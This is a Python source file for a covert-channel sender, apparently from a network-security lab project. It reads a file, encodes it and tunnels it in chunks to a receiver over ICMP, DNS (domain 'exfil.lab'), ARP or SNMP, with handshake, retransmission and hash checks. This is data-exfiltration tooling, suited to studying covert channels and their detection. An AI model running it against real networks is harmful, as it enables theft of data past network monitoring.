from __future__ import annotations

import argparse
import logging
import os
import random

from common.capture import start_capture, stop_capture
from common.cli import (
    LOG_LEVELS,
    configure_logging,
    validate_ipv4,
    validate_non_empty,
    validate_snmp_oid,
    validate_udp_port,
)
from common.codec import encode_payload
from common.config import RuntimeConfig, TYPE_DATA, TYPE_FIN, TYPE_HELLO
from common.dns_tunnel import max_payload_bytes_for_domain, normalize_domain
from common.frame import Frame
from common.integrity import sha256_hex
from sender import arp_transport, dns_transport, snmp_transport, transport as icmp_transport


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Program A: covert-channel sender")
    p.add_argument("--iface", required=True, help="Network interface (e.g., eth0)")
    p.add_argument("--peer", required=True, help="Receiver IPv4")
    p.add_argument("--in", dest="infile", required=True, help="Input text file")
    p.add_argument("--method", choices=("icmp", "dns", "arp", "snmp"), default="icmp", help="Transport protocol")
    p.add_argument("--psk", default=None, help="Pre-shared key (or env NETSEC_PSK)")
    p.add_argument("--chunk-size", type=int, default=256)
    p.add_argument("--timeout", type=float, default=1.5)
    p.add_argument("--retries", type=int, default=4)
    p.add_argument("--dns-domain", default="exfil.lab", help="Domain suffix for DNS method")
    p.add_argument("--dns-port", type=int, default=53, help="Destination UDP port for DNS method")
    p.add_argument("--snmp-community", default="public", help="SNMP community for SNMP method")
    p.add_argument("--snmp-port", type=int, default=161, help="Destination UDP port for SNMP method")
    p.add_argument("--snmp-oid", default="1.3.6.1.4.1.55555.1.0", help="Varbind OID for SNMP method")
    p.add_argument("--pcap", default="captures/sender_capture.pcap")
    p.add_argument("--log-level", choices=LOG_LEVELS, default="INFO", help="Log verbosity")
    return p.parse_args()


def chunkify(data: bytes, chunk_size: int) -> list[bytes]:
    return [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]


def main() -> int:
    args = parse_args()
    configure_logging(args.log_level)
    logger = logging.getLogger("sender")

    cfg = RuntimeConfig(
        iface=args.iface,
        peer_ip=args.peer,
        timeout=args.timeout,
        retries=args.retries,
        chunk_size=args.chunk_size,
    )

    try:
        validate_ipv4(args.peer, "--peer")
        if cfg.chunk_size <= 0:
            raise ValueError("--chunk-size must be > 0")
        if cfg.timeout <= 0:
            raise ValueError("--timeout must be > 0")
        if cfg.retries <= 0:
            raise ValueError("--retries must be > 0")

        dns_domain = None
        if args.method == "dns":
            validate_udp_port(args.dns_port, "--dns-port")
            dns_domain = normalize_domain(args.dns_domain)
            dns_max_payload = max_payload_bytes_for_domain(dns_domain)
            if cfg.chunk_size > dns_max_payload:
                logger.warning("chunk-size=%s too large for DNS labels; using %s", cfg.chunk_size, dns_max_payload)
                cfg.chunk_size = dns_max_payload
        elif args.method == "snmp":
            validate_udp_port(args.snmp_port, "--snmp-port")
            validate_non_empty(args.snmp_community, "--snmp-community")
            validate_snmp_oid(args.snmp_oid)
    except ValueError as exc:
        logger.error("%s", exc)
        return 2

    if not os.path.isfile(args.infile):
        logger.error("Input file not found: %s", args.infile)
        return 2

    with open(args.infile, "rb") as f:
        plain = f.read()

    try:
        encoded = encode_payload(plain, psk=args.psk)
    except ValueError as exc:
        logger.error("Encoding failed: %s", exc)
        return 2

    chunks = chunkify(encoded, cfg.chunk_size)
    total = len(chunks)
    session_id = random.randint(1, 0xFFFFFFFF)
    data_frames = {
        seq: Frame(TYPE_DATA, session_id, seq=seq, total=total, payload=chunk)
        for seq, chunk in enumerate(chunks, start=1)
    }

    logger.info("Session: %s", session_id)
    logger.info("Input bytes: %s | Encoded bytes: %s | Chunks: %s", len(plain), len(encoded), total)
    logger.info("Plain SHA256: %s", sha256_hex(plain))
    logger.info("Method: %s", args.method.upper())

    if args.method == "icmp":
        bpf_filter = f"icmp and host {cfg.peer_ip}"

        def send_packet(frame: Frame) -> None:
            icmp_transport.send_frame(cfg.peer_ip, frame, cfg.iface)

        def wait_ack(seq: int) -> tuple[bool, str]:
            return icmp_transport.wait_for_ack(
                iface=cfg.iface,
                peer_ip=cfg.peer_ip,
                session_id=session_id,
                seq=seq,
                timeout=cfg.timeout,
            )
    elif args.method == "dns":
        bpf_filter = f"udp and host {cfg.peer_ip} and port {args.dns_port}"

        def send_packet(frame: Frame) -> None:
            dns_transport.send_frame(
                cfg.peer_ip,
                frame,
                cfg.iface,
                dns_domain=dns_domain,
                dns_port=args.dns_port,
            )

        def wait_ack(seq: int) -> tuple[bool, str]:
            return dns_transport.wait_for_ack(
                iface=cfg.iface,
                peer_ip=cfg.peer_ip,
                session_id=session_id,
                seq=seq,
                timeout=cfg.timeout,
                dns_domain=dns_domain,
                dns_port=args.dns_port,
            )
    elif args.method == "arp":
        bpf_filter = f"arp and host {cfg.peer_ip}"

        def send_packet(frame: Frame) -> None:
            arp_transport.send_frame(cfg.peer_ip, frame, cfg.iface)

        def wait_ack(seq: int) -> tuple[bool, str]:
            return arp_transport.wait_for_ack(
                iface=cfg.iface,
                peer_ip=cfg.peer_ip,
                session_id=session_id,
                seq=seq,
                timeout=cfg.timeout,
            )
    else:
        bpf_filter = f"udp and host {cfg.peer_ip} and port {args.snmp_port}"

        def send_packet(frame: Frame) -> None:
            snmp_transport.send_frame(
                cfg.peer_ip,
                frame,
                cfg.iface,
                snmp_oid=args.snmp_oid,
                snmp_port=args.snmp_port,
                snmp_community=args.snmp_community,
            )

        def wait_ack(seq: int) -> tuple[bool, str]:
            return snmp_transport.wait_for_ack(
                iface=cfg.iface,
                peer_ip=cfg.peer_ip,
                session_id=session_id,
                seq=seq,
                timeout=cfg.timeout,
                snmp_oid=args.snmp_oid,
                snmp_port=args.snmp_port,
                snmp_community=args.snmp_community,
            )

    cap = start_capture(cfg.iface, args.pcap, bpf_filter=bpf_filter)
    try:
        def send_with_retries(frame: Frame, label: str) -> tuple[bool, str]:
            last_status = "TIMEOUT"
            for attempt in range(1, cfg.retries + 1):
                send_packet(frame)
                ok, status = wait_ack(frame.seq)
                if ok:
                    logger.info("[%s] ACK (attempt %s)", label, attempt)
                    return True, status
                last_status = status
                logger.warning("[%s] %s -> retry %s/%s", label, status, attempt, cfg.retries)
            return False, last_status

        hello = Frame(TYPE_HELLO, session_id, seq=0, total=total, payload=b"HELLO")
        hello_ok, _ = send_with_retries(hello, "HELLO")
        if not hello_ok:
            logger.error("HELLO handshake failed")
            return 3

        for seq in range(1, total + 1):
            sent, _ = send_with_retries(data_frames[seq], f"DATA {seq}/{total}")
            if not sent:
                logger.error("Failed to deliver seq=%s", seq)
                return 3

        fin_payload = sha256_hex(plain).encode()
        fin_seq = total + 1
        fin = Frame(TYPE_FIN, session_id, seq=fin_seq, total=total, payload=fin_payload)

        fin_attempt = 1
        while fin_attempt <= cfg.retries:
            send_packet(fin)
            ok, status = wait_ack(fin_seq)
            if ok:
                logger.info("[FIN] ACK (attempt %s)", fin_attempt)
                logger.info("Transfer complete")
                return 0

            if status.startswith("NACK:MISSING:"):
                missing_token = status.split(":", 2)[2]
                try:
                    missing_seq = int(missing_token)
                except ValueError:
                    missing_seq = -1
                if missing_seq in data_frames:
                    logger.warning("[FIN] Receiver missing seq=%s; retransmitting DATA", missing_seq)
                    recovered, _ = send_with_retries(data_frames[missing_seq], f"RECOVERY {missing_seq}/{total}")
                    if not recovered:
                        logger.error("Failed recovery retransmit for seq=%s", missing_seq)
                        return 3
                    fin_attempt += 1
                    continue

            logger.warning("[FIN] %s -> retry %s/%s", status, fin_attempt, cfg.retries)
            fin_attempt += 1

        logger.error("FIN confirmation failed. Transfer incomplete")
        return 3
    finally:
        stop_capture(cap)


if __name__ == "__main__":
    raise SystemExit(main())
